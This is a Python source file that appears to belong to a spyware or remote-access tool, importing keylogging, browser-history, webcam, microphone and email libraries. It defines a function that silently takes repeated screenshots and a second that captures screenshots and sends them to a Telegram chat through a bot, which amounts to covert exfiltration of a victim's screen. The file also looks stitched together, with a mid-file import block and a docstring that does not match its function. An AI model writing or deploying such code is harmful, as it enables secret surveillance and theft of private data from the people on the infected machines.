
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

def screenshot(screenshot_path: Path):
    """
    Captured screenshots every five seconds.

    :param screenshot_path:  The file path where the screenshots will be stored.
    :return:  Nothing
    """
    # Create directory for screenshot storage #
    screenshot_path.mkdir(parents=True, exist_ok=True)

    for current in range(1, 61):
        # Capture screenshot #
        pic = ImageGrab.grab()
        # Format screenshot output path #
        capture_path = screenshot_path / f'{current}_screenshot.png'
        # Save screenshot to file #
        pic.save(capture_path)
        # Sleep 5 seconds per iteration #
        time.sleep(5)
import telepot
from pathlib import Path

def get(botObj:telepot.Bot, chat_id, number=10, gap=5, path=os.path.join(".","output")):
    """
    Captured screenshots every five seconds.

    :param screenshot_path:  The file path where the screenshots will be stored.
    :return:  Nothing
    """
    # Create directory for screenshot storage #
    Path(path).mkdir(parents=True, exist_ok=True)

    if (botObj is not None):
        botObj.sendMessage(chat_id, "Screenshot for every %s second(s). Total %s picture(s)"%(gap, number))

    for current in range(1, number):
        # Capture screenshot #
        pic = ImageGrab.grab()
        # Format screenshot output path #
        capture_path = os.path.join( path, f'{current}_screenshot.png')
        # Save screenshot to file #
        pic.save(capture_path)
        # Sleep 5 seconds per iteration #
        time.sleep(gap)

    if (botObj is not None):
        media = []
        for file in os.listdir(path):
            if file.endswith(".png"):
                f =open(os.path.join(path, file), 'rb')
                media.append({"type": "photo", "media": f})
        botObj.sendMediaGroup(chat_id, media)
